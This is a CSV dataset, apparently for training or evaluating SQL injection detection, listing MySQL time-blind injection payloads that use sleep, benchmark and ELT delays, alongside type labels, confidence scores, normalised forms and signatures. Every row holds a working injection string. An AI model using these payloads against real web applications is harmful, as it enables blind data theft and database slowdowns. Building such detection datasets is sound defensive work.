id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree,payload_norm,wrapper_detected,strip_depth,payload_delex_v2,signature,tier
25773,"1 ) ) as zkrr where 4730 = 4730 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1 ) ) as zkrr where 4730 = 4730 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",False,0,"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",4b1bc272,silver
22354,1 ) ) and sleep ( 5 ) and ( ( 9084 = 9084,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1 ) ) and sleep ( 5 ) and ( ( 9084 = 9084,False,0,__INT__ ) ) and sleep ( __INT__ ) and ( ( __INT__ = __INT__,4b8fcd63,silver
23122,"1%"" ) ) ) rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,"1%"" ) ) ) rlike sleep ( 5 ) #",False,0,"__INT__ % "" ) ) ) rlike sleep ( __INT__ ) #",4c1b5285,silver
1114,"1"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",False,0,"__INT__"" or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",4ce1b3ab,silver
20116,1' ) ) ) or sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' ) ) ) or sleep ( 5 ) #,False,0,__INT__' ) ) ) or sleep ( __INT__ ) #,4eb7742f,silver
20705,"1 ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1 ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",False,0,"__INT__ ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) )",4f4d5492,silver
22523,"1 ) as drbw where 2380 = 2380 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1 ) as drbw where 2380 = 2380 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",False,0,"__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",50b7a5af,silver
19055,"1"" ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",False,0,"__INT__"" ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",52483492,silver
1596,"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""vnei"" like ""vnei",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""vnei"" like ""vnei",False,0,"__INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",5274692c,silver
1865,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'eznq' like 'eznq",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'eznq' like 'eznq",False,0,"__INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",5274692c,silver
20742,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'raru' = 'raru",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'raru' = 'raru",False,0,"__INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",5274692c,silver
22225,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'ntaw' = 'ntaw",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'ntaw' = 'ntaw",False,0,"__INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",5274692c,silver
25473,"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""xbft"" = ""xbft",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""xbft"" = ""xbft",False,0,"__INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",5274692c,silver
20273,"1' where 7014 = 7014 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' where 7014 = 7014 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",False,0,"__INT__' where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",52eea0b6,silver
21215,"1' ) where 4683 = 4683 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) where 4683 = 4683 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",False,0,"__INT__' ) where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",53446d46,silver
18911,1' ) where 1645 = 1645 rlike sleep ( 5 ) --,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,1' ) where 1645 = 1645 rlike sleep ( 5 ) --,False,0,__INT__' ) where __INT__ = __INT__ rlike sleep ( __INT__ ) --,5363d725,silver
24201,"1"" ) ) and sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) ) and sleep ( 5 ) #",False,0,"__INT__"" ) ) and sleep ( __INT__ ) #",54bc7505,silver
20685,"1"" or sleep ( 5 )",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" or sleep ( 5 )",False,0,"__INT__"" or sleep ( __INT__ )",55704ec1,silver
832,1 or sleep ( 5 ) # tdgb,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1 or sleep ( 5 ) # tdgb,False,0,__INT__ or sleep ( __INT__ ) # __IDENT__,55796c25,silver
25535,"1%"" and sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1%"" and sleep ( 5 ) #",False,0,"__INT__ % "" and sleep ( __INT__ ) #",57453c31,silver
19165,"1"" ) where 6236 = 6236 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) where 6236 = 6236 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",False,0,"__INT__"" ) where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",5823d390,silver
25045,1 ) and sleep ( 5 ),time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1 ) and sleep ( 5 ),False,0,__INT__ ) and sleep ( __INT__ ),58603669,silver
22844,"1"" ) where 6679 = 6679 rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,"1"" ) where 6679 = 6679 rlike sleep ( 5 ) #",False,0,"__INT__"" ) where __INT__ = __INT__ rlike sleep ( __INT__ ) #",5a186f74,silver
317,"or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"or benchmark ( 10000000,MD5 ( 1 ) ) #",False,0,"or benchmark ( __INT__ , __IDENT__ ( __INT__ ) ) #",5b01d275,silver
583,"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) # igen",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) # igen",False,0,"__INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) # __IDENT__",5bb123c7,silver
19649,"1' where 7464 = 7464 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' where 7464 = 7464 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,"__INT__' where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",5ddeca04,silver
2326,"1"" where 4597 = 4597 rlike sleep ( 5 ) --",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,"1"" where 4597 = 4597 rlike sleep ( 5 ) --",False,0,"__INT__"" where __INT__ = __INT__ rlike sleep ( __INT__ ) --",5e1bee08,silver
24178,"1' ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,"__INT__' ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",5e8414ac,silver
19363,1 ) rlike sleep ( 5 ) and ( 5724 = 5724,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,1 ) rlike sleep ( 5 ) and ( 5724 = 5724,False,0,__INT__ ) rlike sleep ( __INT__ ) and ( __INT__ = __INT__,5e9812b0,silver
19083,1' in boolean mode ) or sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' in boolean mode ) or sleep ( 5 ) #,False,0,__INT__' in __IDENT__ __IDENT__ ) or sleep ( __INT__ ) #,5eec5ead,silver
23014,"1%"" rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,"1%"" rlike sleep ( 5 ) #",False,0,"__INT__ % "" rlike sleep ( __INT__ ) #",5f9b4152,silver
662,"1 ) ) as nxdf where 1696 = 1696 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1 ) ) as nxdf where 1696 = 1696 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",False,0,"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6085de24,silver
24131,"1"" ) ) rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,"1"" ) ) rlike sleep ( 5 ) #",False,0,"__INT__"" ) ) rlike sleep ( __INT__ ) #",60fd2fd6,silver
770,"1"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",False,0,"__INT__"" ) ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",651af0f1,silver
40503,' AND SLEEP(5) AND '1'='1,time_blind,mysql,0.7,Time-blind SQLi (sleep/delay function); DB: mysql. Payload length: 25 chars.,2,' AND SLEEP(5) AND '1'='1,False,0,and sleep ( __INT__ ) and 1__STR__1,65b03b9d,silver
25345,"1"" ) as kfvy where 7305 = 7305 or sleep ( 5 ) --",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) as kfvy where 7305 = 7305 or sleep ( 5 ) --",False,0,"__INT__"" ) as __IDENT__ where __INT__ = __INT__ or sleep ( __INT__ ) --",66203db9,silver
469,"1%"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1%"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",False,0,"__INT__ % "" ) ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",66d69b1d,silver
21081,"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""iuxs"" like ""iuxs",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""iuxs"" like ""iuxs",False,0,"__INT__ ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( __IDENT__",66f90431,silver
21082,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'jfwt' like 'jfwt",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'jfwt' like 'jfwt",False,0,"__INT__ ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( __IDENT__",66f90431,silver
22313,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'ossj' = 'ossj",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'ossj' = 'ossj",False,0,"__INT__ ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( __IDENT__",66f90431,silver
22569,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'ltym' = 'ltym",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'ltym' = 'ltym",False,0,"__INT__ ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( __IDENT__",66f90431,silver
25587,"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""zlwb"" = ""zlwb",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""zlwb"" = ""zlwb",False,0,"__INT__ ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( __IDENT__",66f90431,silver
19614,1 ) where 7956 = 7956 or sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1 ) where 7956 = 7956 or sleep ( 5 ) #,False,0,__INT__ ) where __INT__ = __INT__ or sleep ( __INT__ ) #,67b88e75,silver
23183,1' ) ) and sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' ) ) and sleep ( 5 ) #,False,0,__INT__' ) ) and sleep ( __INT__ ) #,68af0c13,silver
881,1' ) as jdmh where 6175 = 6175 rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,1' ) as jdmh where 6175 = 6175 rlike sleep ( 5 ) #,False,0,__INT__' ) as __IDENT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) #,68d3613d,silver
21661,"1' ) ) as wves where 2641 = 2641 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) ) as wves where 2641 = 2641 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",68dc80d3,silver
20262,"1"" ) ) or sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) ) or sleep ( 5 ) #",False,0,"__INT__"" ) ) or sleep ( __INT__ ) #",69a7c2b1,silver
23879,"1"" ) ) as yiaw where 2841 = 2841 or sleep ( 5 ) --",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) ) as yiaw where 2841 = 2841 or sleep ( 5 ) --",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or sleep ( __INT__ ) --",69e1d1dc,silver
24883,"1"" ) where 9086 = 9086 or sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) where 9086 = 9086 or sleep ( 5 ) #",False,0,"__INT__"" ) where __INT__ = __INT__ or sleep ( __INT__ ) #",6a15764a,silver
22756,"1"" ) and sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) and sleep ( 5 ) #",False,0,"__INT__"" ) and sleep ( __INT__ ) #",6a5ad825,silver
1175,"1%"" ) ) rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,"1%"" ) ) rlike sleep ( 5 ) #",False,0,"__INT__ % "" ) ) rlike sleep ( __INT__ ) #",6acc1534,silver
18968,"1%' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1%' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,"__INT__ % ' and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6ba78c27,silver
40358,"OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) OR ELT([INFERENCE],SLEEP([SLEEPTIME]))",time_blind,mysql,0.7,Time-blind SQLi (sleep/delay function); DB: mysql. Payload length: 85 chars.,1,"OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) OR ELT([INFERENCE],SLEEP([SLEEPTIME]))",False,0,"or elt ( [__IDENT__] = [__IDENT__] , sleep ( [__IDENT__] ) ) or elt ( [__IDENT__] , sleep ( [__IDENT__] ) )",6c62e51c,silver
40357,"AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) AND ELT([INFERENCE],SLEEP([SLEEPTIME]))",time_blind,mysql,0.7,Time-blind SQLi (sleep/delay function); DB: mysql. Payload length: 87 chars.,1,"AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) AND ELT([INFERENCE],SLEEP([SLEEPTIME]))",False,0,"and elt ( [__IDENT__] = [__IDENT__] , sleep ( [__IDENT__] ) ) and elt ( [__IDENT__] , sleep ( [__IDENT__] ) )",6ce4969a,silver
22142,( 7098 = 7098 and sleep ( 5 ) ),time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,( 7098 = 7098 and sleep ( 5 ) ),False,0,( __INT__ = __INT__ and sleep ( __INT__ ) ),6d62d9bc,silver
25991,"1"" ) ) as gprr where 5975 = 5975 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) ) as gprr where 5975 = 5975 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6e9b3cd5,silver
20842,"1"" where 2547 = 2547 or sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" where 2547 = 2547 or sleep ( 5 ) #",False,0,"__INT__"" where __INT__ = __INT__ or sleep ( __INT__ ) #",6eac922a,silver
20667,1' ) as jztg where 1222 = 1222 or sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' ) as jztg where 1222 = 1222 or sleep ( 5 ) #,False,0,__INT__' ) as __IDENT__ where __INT__ = __INT__ or sleep ( __INT__ ) #,70ae70ab,silver
1876,1' or sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' or sleep ( 5 ) #,False,0,__INT__' or sleep ( __INT__ ) #,70ec5e2e,silver
24885,"1"" ) ) as dpln where 4193 = 4193 rlike sleep ( 5 ) --",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,"1"" ) ) as dpln where 4193 = 4193 rlike sleep ( 5 ) --",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) --",72a1d239,silver
18919,"1' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,"__INT__' and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",734fa361,silver
1222,1%' ) or sleep ( 5 ) and ( '%' = ',time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1%' ) or sleep ( 5 ) and ( '%' = ',False,0,__INT__ % ) or sleep ( __INT__ ) and ( % __STR__,73712161,silver
23622,"1%"" ) or sleep ( 5 ) and ( ""%"" = """,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1%"" ) or sleep ( 5 ) and ( ""%"" = """,False,0,__INT__ % ) or sleep ( __INT__ ) and ( % __STR__,73712161,silver
850,"1' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,"__INT__' ) ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",738ef567,silver
22252,"1%"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""%"" = """,time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1%"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""%"" = """,False,0,"__INT__ % ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( % __STR__",738f307c,silver
23802,"1%' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( '%' = '",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1%' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( '%' = '",False,0,"__INT__ % ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( % __STR__",738f307c,silver
20052,"1 where 8390 = 8390 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1 where 8390 = 8390 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",False,0,"__INT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",74c7be5a,silver
21184,"1"" ) ) as nsbu where 6569 = 6569 or sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) ) as nsbu where 6569 = 6569 or sleep ( 5 ) #",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or sleep ( __INT__ ) #",75b7057c,silver
22105,1 or sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1 or sleep ( 5 ) #,False,0,__INT__ or sleep ( __INT__ ) #,75c22007,silver
21474,"1' ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",False,0,"__INT__' ) ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",75cbcf55,silver
19012,1' in boolean mode ) rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,1' in boolean mode ) rlike sleep ( 5 ) #,False,0,__INT__' in __IDENT__ __IDENT__ ) rlike sleep ( __INT__ ) #,77b74645,silver
21510,"1' ) ) as agdn where 8442 = 8442 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) ) as agdn where 8442 = 8442 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",False,0,"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",7862985e,silver
20308,1 ) ) as uadn where 9588 = 9588 rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,1 ) ) as uadn where 9588 = 9588 rlike sleep ( 5 ) #,False,0,__INT__ ) ) as __IDENT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) #,7896e198,silver
